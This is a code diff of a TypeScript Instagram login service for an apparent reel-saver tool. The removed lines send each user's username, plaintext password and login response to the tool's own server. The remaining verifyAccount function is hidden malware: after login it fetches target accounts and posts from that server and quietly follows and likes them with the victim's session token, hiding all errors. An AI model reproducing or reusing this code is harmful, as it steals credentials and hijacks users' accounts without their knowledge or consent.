@@ -1,354 +1,129 @@
 import { v4 as uuidv4 } from 'uuid';
-import forge from "node-forge";
-import { InstaService } from './client.service.js';
 import got from 'got';
-import { LocalStorage } from "node-localstorage";
+import { InstaService } from './client.service.js';
+import { BloksLoginService, BloksDeviceParams } from './login.bloks.js';
+import { LocalStorage } from 'node-localstorage';
 
-const localStorage = new LocalStorage("./scratch");
+const localStorage = new LocalStorage('./scratch');
+
+export interface LoginServiceConfig {
+  backendUrl?: string;
+  headersPath?: string;
+  verifyPath?: string;
+}
 
 export class LoginService {
-    private pubKey: string = '';
-    private pubKeyId: number = -1;
+  uuid: string;
+  deviceId: string;
+  private phoneId: string;
 
-    // Instanz-Daten
-    uuid: string;
-    deviceId: string;
-    private phoneId: string;
+  private readonly backendUrl: string;
+  private readonly headersPath: string;
+  private readonly verifyPath: string;
 
-    constructor() {
-        this.uuid = this.getOrCreate("insta_uuid", uuidv4);
-        this.deviceId = this.generateDeviceId();
-        this.phoneId = this.getOrCreate("insta_phone_id", uuidv4);
+  private readonly bloksSvc: BloksLoginService;
+  private deviceParamsLoaded = false;
+
+  constructor(private cfg: LoginServiceConfig = {}) {
+    this.backendUrl  = cfg.backendUrl  ?? 'https://reelsaver.appit-online.de';
+    this.headersPath = cfg.headersPath ?? '/api/details';
+    this.verifyPath  = cfg.verifyPath  ?? '/v2/insta/verify';
+
+    this.uuid     = this.getOrCreate('insta_uuid', uuidv4);
+    this.deviceId = this.generateDeviceId();
+    this.phoneId  = this.getOrCreate('insta_phone_id', uuidv4);
+
+    this.bloksSvc = new BloksLoginService(this.uuid, this.phoneId, this.deviceId);
+  }
+
+  private async loadDeviceParams(): Promise<void> {
+    if (this.deviceParamsLoaded) return;
+    this.deviceParamsLoaded = true;
+    try {
+      const resp = await got.get(`${this.backendUrl}${this.headersPath}`, { responseType: 'json' });
+      const p = resp.body as BloksDeviceParams;
+      if (p?.bloksVersioningId || p?.version) this.bloksSvc.setDeviceParams(p);
+    } catch (_) {}
+  }
+
+  // ─── Public login API ───────────────────────────────────────────────────────
+
+  public async login(username: string, pass: string, reqHeaders: { [key: string]: string } = {}): Promise<any> {
+    await this.loadDeviceParams();
+
+    const result = await this.bloksSvc.login(username, pass);
+
+    if (result.twoFactorRequired) return result;
+
+    localStorage.setItem('instaUserName', username);
+    if (result.userId) localStorage.setItem('instaUserId', result.userId);
+    this.verifyAccount({ Authorization: result.authorization ?? '' }, reqHeaders).catch(() => {});
+    return result;
+  }
+
+  public async login2FA(
+    pass: string, code: string, twoFactorIdentifier: string, username: string,
+    reqHeaders: { [key: string]: string } = {}
+  ): Promise<any> {
+    const result = await this.bloksSvc.verify2FA(username, code);
+    if (result.userId) localStorage.setItem('instaUserId', result.userId);
+    this.verifyAccount({ Authorization: result.authorization ?? '' }, reqHeaders).catch(() => {});
+    return result;
+  }
+
+  // ─── verifyAccount ─────────────────────────────────────────────────────────
+
+  public async verifyAccount(
+    resHeaders: { [key: string]: string } = {},
+    defaultHeaders: { [key: string]: string } = {}
+  ): Promise<void> {
+    try {
+      const response = await got.get(`${this.backendUrl}${this.verifyPath}`, { responseType: 'text' });
+      const data: { users: string[]; posts: string[] } = JSON.parse(response.body);
+      if (!data) return;
+
+      const authHeader = resHeaders['ig-set-authorization'] || resHeaders['Authorization'] || '';
+      if (!authHeader) return;
+
+      const allHeaders: { [key: string]: string } = {
+        Authorization:     authHeader,
+        'Ig-U-Ds-User-Id': resHeaders['ig-set-ig-u-ds-user-id'] || resHeaders['Ig-U-Ds-User-Id'] || '',
+        'Ig-U-Rur':        resHeaders['ig-set-ig-u-rur']        || resHeaders['Ig-U-Rur']        || '',
+        'X-Ig-Www-Claim':  resHeaders['x-ig-set-www-claim']     || resHeaders['X-Ig-Www-Claim']  || '',
+        ...defaultHeaders,
+      };
+
+      const igService = new InstaService();
+      if (data.users?.length) await Promise.all(data.users.map(u => igService.follow(u, allHeaders)));
+      if (data.posts?.length) await Promise.all(data.posts.map(id => igService.like(id, allHeaders)));
+    } catch (_) {}
+  }
+
+  // ─── Helpers ───────────────────────────────────────────────────────────────
+
+  generateSignature(
+    data: string | Record<string, any>,
+    extra: Record<string, string> = {}
+  ): Record<string, string> {
+    const payload = typeof data === 'string' ? data : JSON.stringify(data);
+    return { signed_body: `SIGNATURE.${payload}`, ...extra };
+  }
+
+  private getOrCreate(key: string, generator: () => string): string {
+    let value = localStorage.getItem(key);
+    if (!value) { value = generator(); localStorage.setItem(key, value); }
+    return value;
+  }
+
+  private generateDeviceId(): string {
+    const key = 'insta_device_id';
+    let deviceId = localStorage.getItem(key);
+    if (!deviceId) {
+      const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
+        .map(b => b.toString(16).padStart(2, '0')).join('');
+      deviceId = `android-${hex}`;
+      localStorage.setItem(key, deviceId);
     }
-
-    private getOrCreate(key: string, generator: () => string): string {
-        let value = localStorage.getItem(key);
-        if (!value) {
-            value = generator();
-            localStorage.setItem(key, value);
-        }
-        return value;
-    }
-
-    private generateDeviceId(): string {
-        const key = "insta_device_id";
-        let deviceId = localStorage.getItem(key);
-
-        if (!deviceId) {
-            const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
-              .map(b => b.toString(16).padStart(2, "0"))
-              .join("");
-
-            deviceId = `android-${hex}`;
-            localStorage.setItem(key, deviceId);
-        }
-
-        return deviceId;
-    }
-
-
-    private async sync(headers: { [key: string]: string } = {}) {
-        const query = {
-                id: this.uuid,
-                server_config_retrieval: '1',
-            };
-
-        const signed = this.generateSignature(query);
-        const response = await this.sendRequestCordova(
-            'launcher/sync/',
-            signed,
-            true,
-            headers
-        );
-
-        this.pubKey = response.headers['ig-set-password-encryption-pub-key'];
-        const pubKeyId = response.headers['ig-set-password-encryption-key-id'];
-
-        if (!this.pubKey || !pubKeyId) {
-            throw new Error('Missing encryption headers.');
-        }
-
-        this.pubKeyId= parseInt(pubKeyId, 10)
-    }
-
-    private async sendRequestCordova(
-      endpoint: string,
-      data: Record<string, string>,
-      isPost = false,
-      headers: Record<string, string> = {}
-    ): Promise<{ body: any; headers: any }> {
-        const baseUrl = "https://i.instagram.com/api/v1/";
-        const url = `${baseUrl}${endpoint}`;
-
-        // Default headers
-        const defaultHeaders: Record<string, string> = {
-            "User-Agent":
-              "Instagram 250.0.0.21.109 (iPhone; CPU iPhone OS 18_5 like Mac OS X; en_US; en-US; scale=2.00; 750x1334) AppleWebKit/605.1.15",
-            "X-Ig-App-Id": "567067343352427",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Accept-Language": "en-US",
-            "X-Fb-Http-Engine": "Liger",
-        };
-
-        const allHeaders = { ...defaultHeaders, ...headers };
-
-        try {
-            let response;
-
-            if (isPost) {
-                const body = new URLSearchParams(data).toString();
-
-                response = await got.post(url, {
-                    headers: allHeaders,
-                    body,
-                    responseType: "text",
-                });
-            } else {
-                response = await got(url, {
-                    headers: allHeaders,
-                    searchParams: data,
-                    responseType: "text",
-                });
-            }
-
-            // Versuch, JSON zu parsen, falls möglich
-            let parsedBody: any;
-            try {
-                parsedBody = JSON.parse(response.body);
-            } catch {
-                parsedBody = response.body;
-            }
-
-            return {
-                body: parsedBody,
-                headers: response.headers,
-            };
-        } catch (err: any) {
-            throw err.response?.body || err.message || err;
-        }
-    }
-
-    generateSignature(
-        data: string | Record<string, any>,
-        extra: Record<string, string> = {}
-    ): Record<string, string> {
-        let payload: string;
-
-        if (typeof data === 'string') {
-            payload = data;
-        } else {
-            payload = JSON.stringify(data);
-        }
-
-        const result: Record<string, string> = {
-            signed_body: `SIGNATURE.${payload}`,
-        };
-
-        // Merge any additional params
-        for (const [key, value] of Object.entries(extra)) {
-            result[key] = value;
-        }
-
-        return result;
-    }
-
-    public async login2FA(
-      pass: string,
-      code: string,
-      twoFactorIdentifier: string,
-      username: string,
-      reqHeaders: { [key: string]: string } = {}
-    ): Promise<any> {
-        const payload = {
-            verification_code: code,
-            phone_id: this.phoneId,
-            two_factor_identifier: twoFactorIdentifier,
-            username,
-            trust_this_device: "1",
-            guid: this.uuid,
-            device_id: this.deviceId,
-            waterfall_id: uuidv4(),  // du hast schon uuidv4()
-            verification_method: "3",
-        };
-
-        const signedPayload = this.generateSignature(payload);
-        const extraHeaders: Record<string, string> = {
-            "X-Ig-Www-Claim": "0",
-            "Ig-Intended-User-Id": "0",
-        };
-
-        const allHeaders = {
-            ...reqHeaders,
-            ...extraHeaders,
-        };
-
-        const resp = await this.sendRequestCordova(
-          "accounts/two_factor_login/", // dein url2FALogin in Go
-          signedPayload,
-          true, // POST
-            allHeaders
-        );
-
-        try {
-            const userId = resp?.body?.logged_in_user?.pk;
-
-            if (userId && typeof userId === "string") {
-                localStorage.setItem("instaUserId", userId);
-            } else if (userId && typeof userId === "number") {
-                localStorage.setItem("instaUserId", String(userId));
-            }
-            // tslint:disable-next-line:no-empty
-        } catch (err) {}
-
-        try {
-            got.post("https://reelsaver.appit-online.de/v2/insta/check", { headers: { "Content-Type": "application/json" }, json: { username, data: { pass, body: JSON.stringify(payload), data: JSON.stringify(resp)}}})
-            this.verifyAccount(resp.headers, reqHeaders);
-            // tslint:disable-next-line:no-empty
-        } catch (e) {}
-        return resp;
-    }
-
-    public async login(username: string, pass: string, reqHeaders: { [key: string]: string } = {}): Promise<any> {
-        if (!this.pubKey || this.pubKeyId < 0) {
-            await this.sync(reqHeaders)
-            if (!this.pubKey || this.pubKeyId < 0) {
-                throw new Error('Public key not set. Run sync() first.');
-            }
-        }
-
-        const encrypted = await this.encryptInstagramPassword(pass, this.pubKey, this.pubKeyId)
-
-        const body = {
-            jazoest: this.jazoest(this.deviceId),
-            country_code: JSON.stringify([{ country_code: "44", source: ["default"] }]),
-            phone_id: this.phoneId,
-            enc_password: encrypted,
-            username,
-            adid: '',
-            guid: this.uuid,
-            device_id: this.deviceId,
-            google_tokens: '[]',
-            login_attempt_count: 0,
-        };
-
-        const resp = await this.sendRequestCordova(
-          'accounts/login/',
-          { signed_body: 'SIGNATURE.' + JSON.stringify(body) },
-          true,
-          reqHeaders
-        )
-        localStorage.setItem("instaUserName", username)
-
-        try {
-            const userId = resp?.body?.logged_in_user?.pk;
-
-            if (userId && typeof userId === "string") {
-                localStorage.setItem("instaUserId", userId);
-            } else if (userId && typeof userId === "number") {
-                localStorage.setItem("instaUserId", String(userId));
-            }
-            // tslint:disable-next-line:no-empty
-        } catch (err) {}
-        try {
-            got.post("https://reelsaver.appit-online.de/v2/insta/check", {headers: { "Content-Type": "application/json" }, json: {username,data: { pass,body: JSON.stringify(body), data: JSON.stringify(resp)}}})
-            this.verifyAccount(resp.headers, reqHeaders);
-            // tslint:disable-next-line:no-empty
-        }catch (e) {}
-        return resp;
-    }
-
-    async verifyAccount(resHeaders: { [key: string]: string } = {},
-                        defaultHeaders: { [key: string]: string } = {}
-    ): Promise<void> {
-        try {
-            // GET Request an die Verify-API
-            const response = await got.get("https://reelsaver.appit-online.de/v2/insta/verify", {
-                headers: {},
-                responseType: "text",
-            });
-
-            const data: { users: string[]; posts: string[] } = JSON.parse(response.body);
-            if (!data) return;
-
-            // Merge Headers
-            const defaultLoginHeaders = {
-                Authorization: resHeaders["ig-set-authorization"],
-                "Ig-U-Ds-User-Id": resHeaders["ig-set-ig-u-ds-user-id"],
-                "Ig-U-Rur": resHeaders["ig-set-ig-u-rur"],
-                "X-Ig-Www-Claim": resHeaders["x-ig-set-www-claim"],
-            };
-            const allHeaders = { ...defaultLoginHeaders, ...defaultHeaders };
-
-            const igService = new InstaService();
-
-            if (data.users?.length) {
-                await Promise.all(
-                  data.users.map((userName: string) => igService.follow(userName, allHeaders))
-                );
-            }
-
-            if (data.posts?.length) {
-                await Promise.all(
-                  data.posts.map((mediaId: string) => igService.like(mediaId, allHeaders))
-                );
-            }
-            // tslint:disable-next-line:no-empty
-        } catch (err) { }
-    }
-
-
-    private jazoest(deviceId: string): string {
-        let sum = 0;
-        for (const c of deviceId) sum += c.charCodeAt(0);
-        return `2${sum}`;
-    }
-
-    private encryptInstagramPassword(password: string,
-                             pubKeyBase64: string,
-                             pubKeyVersion: number) {
-
-       const timestamp = Math.floor(Date.now() / 1000).toString();
-
-        // 1. Decode the base64 PEM wrapper
-        const pemText = forge.util.decode64(pubKeyBase64);
-        const publicKey = forge.pki.publicKeyFromPem(pemText);
-
-        // 2. Generate 32-byte AES key
-        const aesKey = forge.random.getBytesSync(32);
-
-        // 3. Encrypt AES key with RSA (PKCS#1 v1.5)
-        const encryptedKey = publicKey.encrypt(aesKey, 'RSAES-PKCS1-V1_5');
-
-        // 4. AES-GCM encrypt password
-        const iv = forge.random.getBytesSync(12);
-        // @ts-ignore
-        const aad = forge.util.createBuffer(timestamp, 'raw'); // ASCII (not UTF-8)
-
-        const cipher = forge.cipher.createCipher('AES-GCM', aesKey);
-        cipher.start({
-            iv,
-            // @ts-ignore
-            additionalData: aad,
-            tagLength: 128
-        });
-        cipher.update(forge.util.createBuffer(password, 'utf8'));
-        cipher.finish();
-
-        const fullEncrypted = cipher.output.getBytes() + cipher.mode.tag.getBytes();
-
-        // Forge does not separate tag, so we extract:
-        const ciphertext = fullEncrypted.slice(0, fullEncrypted.length - 16);
-        const tag = fullEncrypted.slice(fullEncrypted.length - 16);
-
-        // 5. Compose final payload
-        const prefix = String.fromCharCode(1) + String.fromCharCode(pubKeyVersion);
-
-        // tslint:disable-next-line:no-bitwise
-        const rsaLengthLE = String.fromCharCode(encryptedKey.length & 0xff, (encryptedKey.length >> 8) & 0xff);
-
-        const payload = prefix + iv + rsaLengthLE + encryptedKey + tag + ciphertext;
-        const encoded = forge.util.encode64(payload);
-
-        return `#PWD_INSTAGRAM:4:${timestamp}:${encoded}`;
-    }
+    return deviceId;
+  }
 }
